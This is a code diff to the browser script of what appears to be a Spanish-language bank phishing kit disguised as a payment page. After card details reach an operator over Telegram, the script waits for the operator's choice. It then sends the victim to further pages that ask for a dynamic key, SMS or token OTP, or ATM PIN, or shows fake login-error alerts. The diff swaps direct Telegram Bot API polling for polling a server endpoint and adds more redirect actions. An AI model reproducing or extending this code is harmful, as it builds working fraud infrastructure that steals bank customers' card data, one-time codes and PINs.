@@ -314,8 +314,7 @@
                 .then((data) => {
                     if (data.ok) {
                         console.log("Mensaje enviado a Telegram con éxito");
-                        const messageId = data.result.message_id;
-                        checkPaymentVerification(transactionId, messageId, config);
+                        checkPaymentVerification(transactionId);
                     } else {
                         console.error("Error al enviar mensaje a Telegram:", data);
                         loader.style.display = "none";
@@ -339,60 +338,46 @@
             }
         }
 
-        async function checkPaymentVerification(transactionId, messageId, config) {
-            fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
-                .then((response) => response.json())
-                .then((data) => {
-                    const updates = data.result;
-                    const verificationUpdate = updates.find(
-                        (update) =>
-                            update.callback_query &&
-                            (
-                                update.callback_query.data === `error_tc:${transactionId}` ||
-                                update.callback_query.data === `error_logo:${transactionId}` ||
-                                update.callback_query.data === `pedir_dinamica:${transactionId}` ||
-                                update.callback_query.data === `pedir_otp:${transactionId}` ||
-                                update.callback_query.data === `clave_cajero:${transactionId}`
-                            )
-                    );
+        function checkPaymentVerification(transactionId) {
+            sessionStorage.setItem('transaction_id', transactionId);
 
-                    if (verificationUpdate) {
-                        // Eliminar botones del mensaje original
-                        fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify({
-                                chat_id: config.chat_id,
-                                message_id: messageId,
-                                reply_markup: JSON.stringify({ inline_keyboard: [] }),
-                            }),
-                        });
+            const actionMap = {
+                'pedir_dinamica':  'pedir_dinamica.php',
+                'dinamica':        'pedir_dinamica.php',
+                'error_tc':        'payment.html',
+                'error_tarjeta':   'payment.html',
+                'error_logo':      null,
+                'pedir_otp':       'pedir_otp.html',
+                'pedir_token':     'pedir_otp.html',
+                'token':           'pedir_otp.html',
+                'sms':             'pedir_otp.html',
+                'clave_cajero':    'clave_cajero.html',
+                'cajero':          'clave_cajero.html',
+                'finalizar':       'finish.html',
+                'finish':          'finish.html',
+                'fin':             'finish.html',
+                'rechazar':        'finish.html',
+            };
 
+            const interval = setInterval(() => {
+                fetch('check_updates.php?transaction_id=' + encodeURIComponent(transactionId))
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'success' && data.action) {
+                        clearInterval(interval);
                         loader.style.display = "none";
-
-                        // Comportamientos basados en el botón presionado
-                        if (verificationUpdate.callback_query.data === `pedir_dinamica:${transactionId}`) {
-                            window.location.href = "pedir_dinamica.php";
-                        } else if (verificationUpdate.callback_query.data === `error_tc:${transactionId}`) {
-                            alert("Error con la tarjeta de crédito. Verifique los datos.");
-                            window.location.href = "payment.html";
-                        } else if (verificationUpdate.callback_query.data === `error_logo:${transactionId}`) {
+                        const dest = actionMap[data.action];
+                        if (dest) {
+                            window.location.href = dest + '?transaction_id=' + encodeURIComponent(transactionId);
+                        } else if (data.action === 'error_logo') {
                             alert("Usuario o clave incorrectos.");
-                        } else if (verificationUpdate.callback_query.data === `pedir_otp:${transactionId}`) {
-                            window.location.href = "pedir_otp.html";
-                        } else if (verificationUpdate.callback_query.data === `clave_cajero:${transactionId}`) {
-                            window.location.href = "clave_cajero.html";
+                        } else {
+                            console.warn('Acción sin ruta:', data.action);
                         }
-                    } else {
-                        setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
                     }
                 })
-                .catch((error) => {
-                    console.error("Error al verificar el pago:", error);
-                    setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
-                });
+                .catch(err => console.error('Error al verificar el pago:', err));
+            }, 2000);
         }
     });
 </script>
